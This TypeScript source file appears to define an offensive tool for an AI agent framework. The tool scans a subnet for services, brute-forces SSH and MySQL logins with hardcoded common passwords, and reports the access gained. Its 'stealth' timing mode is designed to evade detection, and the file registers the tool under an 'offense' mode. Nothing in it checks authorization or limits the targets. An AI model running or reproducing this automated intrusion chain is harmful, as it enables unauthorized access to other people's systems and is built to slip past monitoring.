import { tool } from "ai";
import { z } from "zod";
import { registerTool } from "../mode.js";
import { sh } from "../execContext.js";
import { stealthDelay } from "../stealth.js";
import type { ToolResult } from "../types.js";

const COMMON_PASSWORDS = [
  "password", "admin", "root", "123456", "12345678", "qwerty", "letmein",
  "welcome", "Passw0rd!", "toor", "test", "1234", "passwd", "abc123",
  "password123", "P@ssw0rd", "changeme", "secret", "default", "guest",
];

const COMMON_USERS = ["root", "admin", "user", "test", "administrator", "ubuntu"];

/**
 * Auto-chain: scan subnet → identify services → brute creds → report access.
 * Speed levels:
 *   "stealth"  — 5-15s delay between attempts, minimal concurrent probes
 *   "normal"   — 2-5s delay
 *   "aggressive" — no delay, fast scan
 */
export function createAutoChainTool() {
  return tool({
    description: "Autonomously scan a subnet, identify services, attempt common credentials, and report any access gained. Supports stealth timing control.",
    inputSchema: z.object({
      subnet: z.string().describe("Target subnet (e.g., '192.168.1.0/24')"),
      ports: z.string().optional().describe("Ports to scan (default: '22,80,443,3306,3389,5432,6379,8080,8443,27017')"),
      speed: z.enum(["stealth", "normal", "aggressive"]).optional().describe("Scan speed (default: normal)"),
      skipBrute: z.boolean().optional().describe("Skip brute force attempts (default: false)"),
    }),
    execute: async ({ subnet, ports, speed, skipBrute }): Promise<ToolResult> => {
      const targetPorts = ports ?? "22,80,443,3306,3389,5432,6379,8080,8443,27017";
      const speedLevel = speed ?? "normal";
      const results: string[] = [];
      const access: string[] = [];

      results.push(`[chain] Target: ${subnet}`);
      results.push(`[chain] Ports: ${targetPorts}`);
      results.push(`[chain] Speed: ${speedLevel}`);
      results.push("");

      // ── Phase 1: Scan ──────────────────────────────────
      results.push("=== Phase 1: Port Scan ===");

      // Use nmap if available, otherwise fall back to netcat
      const hasNmap = await checkTool("nmap");

      let hosts: Array<{ ip: string; openPorts: Array<{ port: number; service: string }> }> = [];

      if (hasNmap) {
        results.push("  Using nmap (fast, detailed)...");
        const nmapSpeed = speedLevel === "stealth" ? "T2" : speedLevel === "aggressive" ? "T5" : "T4";
        const nmapCmd = `nmap -${nmapSpeed} -p ${targetPorts} --open -oG - ${subnet} 2>/dev/null`;

        const output = await run(nmapCmd, speedLevel);

        // Parse grepable output
        for (const line of output.split("\n")) {
          if (line.includes("Ports:")) {
            const ipMatch = line.match(/Host:\s+(\S+)/);
            const portsSection = line.split("Ports:")[1];
            if (ipMatch && portsSection) {
              const openPorts: Array<{ port: number; service: string }> = [];
              for (const p of portsSection.split("/,").map((s) => s.trim())) {
                const parts = p.split("/");
                if (parts.length >= 5) {
                  const port = parseInt(parts[0], 10);
                  const state = parts[1];
                  const service = parts[4];
                  if (state === "open" && !isNaN(port)) {
                    openPorts.push({ port, service: service || "unknown" });
                  }
                }
              }
              if (openPorts.length > 0) {
                hosts.push({ ip: ipMatch[1], openPorts });
              }
            }
          }
        }
      } else {
        results.push("  Using netcat (slow, basic)...");
        // Fallback: ping sweep then port check
        const base = subnet.split("/")[0].split(".").slice(0, 3).join(".");
        for (let i = 1; i <= 254; i++) {
          const ip = `${base}.${i}`;
          await slowDelay(speedLevel);
          const alive = await run(`ping -c 1 -W 1 ${ip} 2>/dev/null && echo 'alive' || true`, speedLevel);
          if (alive.includes("alive")) {
            const openPorts: Array<{ port: number; service: string }> = [];
            for (const portStr of targetPorts.split(",")) {
              const port = parseInt(portStr.trim(), 10);
              await slowDelay(speedLevel);
              const check = await run(`timeout 1 bash -c 'echo > /dev/tcp/${ip}/${port} 2>/dev/null && echo open' || true`, speedLevel);
              if (check.includes("open")) {
                openPorts.push({ port, service: guessService(port) });
              }
            }
            if (openPorts.length > 0) {
              hosts.push({ ip, openPorts });
            }
          }
        }
      }

      if (hosts.length === 0) {
        results.push("  No hosts with open ports found.");
        return { success: true, data: results.join("\n") };
      }

      results.push(`  Found ${hosts.length} host(s) with open ports:\n`);
      for (const h of hosts) {
        const portsList = h.openPorts.map((p) => `    ${p.port}/${p.service}`).join("\n");
        results.push(`  ${h.ip}:`);
        results.push(portsList);
      }
      results.push("");

      // ── Phase 2: Brute force ────────────────────────────
      if (!skipBrute) {
        results.push("=== Phase 2: Credential Attempts ===");

        for (const host of hosts) {
          for (const p of host.openPorts) {
            const creds = await tryBruteForce(host.ip, p.port, p.service, speedLevel);
            for (const c of creds) {
              access.push(`${host.ip}:${p.port} — ${c}`);
            }
          }
        }

        if (access.length > 0) {
          results.push(`  ✅ Gained access to ${access.length} service(s):\n`);
          for (const a of access) results.push(`    ${a}`);
        } else {
          results.push("  No credentials worked on discovered services.");
        }
      }

      // ── Summary ────────────────────────────────────────
      results.push("");
      results.push("=== Summary ===");
      results.push(`Hosts with open ports: ${hosts.length}`);
      results.push(`Services accessible: ${access.length > 0 ? access.join(", ") : "none without credentials"}`);
      results.push(`Total attempts: stealth-level was ${speedLevel}`);

      return { success: true, data: results.join("\n") };
    },
  });
}

async function checkTool(name: string): Promise<boolean> {
  try {
    const out = await sh(`which ${name} 2>/dev/null || echo ''`, 5_000);
    return out.trim().length > 0;
  } catch { return false; }
}

async function run(cmd: string, speed: string): Promise<string> {
  await slowDelay(speed);
  try {
    return await sh(cmd, 60_000);
  } catch {
    return "";
  }
}

async function slowDelay(speed: string): Promise<void> {
  if (speed === "stealth") {
    await stealthDelay();
    await new Promise((r) => setTimeout(r, 2000 + Math.random() * 8000));
  } else if (speed === "normal") {
    await new Promise((r) => setTimeout(r, 500 + Math.random() * 1500));
  }
  // aggressive = no delay
}

async function tryBruteForce(
  ip: string,
  port: number,
  service: string,
  speed: string,
): Promise<string[]> {
  const results: string[] = [];

  if (service === "ssh" || port === 22) {
    const hasSshpass = await checkTool("sshpass");
    if (!hasSshpass) return [];

    for (const user of COMMON_USERS.slice(0, 4)) {
      for (const pass of COMMON_PASSWORDS.slice(0, 10)) {
        await slowDelay(speed);
        const out = await run(
          `sshpass -p '${pass.replace(/'/g, "'\\''")}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 ${user}@${ip} 'id' 2>/dev/null || true`,
          speed,
        );
        if (out.includes("uid=")) {
          results.push(`SSH ${user}:${pass}`);
          return results; // one cred per host is enough
        }
      }
    }
  }

  if (service === "mysql" || port === 3306) {
    for (const user of ["root", "admin"]) {
      for (const pass of COMMON_PASSWORDS.slice(0, 10)) {
        await slowDelay(speed);
        const out = await run(
          `mysql -h ${ip} -u ${user} -p'${pass.replace(/'/g, "'\\''")}' -e 'SELECT 1' 2>/dev/null || true`,
          speed,
        );
        if (out.includes("1")) {
          results.push(`MySQL ${user}:${pass}`);
          return results;
        }
      }
    }
  }

  return results;
}

function guessService(port: number): string {
  const map: Record<number, string> = {
    22: "ssh", 23: "telnet", 80: "http", 443: "https",
    3306: "mysql", 3389: "rdp", 5432: "postgresql",
    6379: "redis", 8080: "http-proxy", 8443: "https-alt",
    27017: "mongodb", 21: "ftp", 25: "smtp", 445: "smb",
  };
  return map[port] || "unknown";
}

registerTool("auto_chain", "offense");
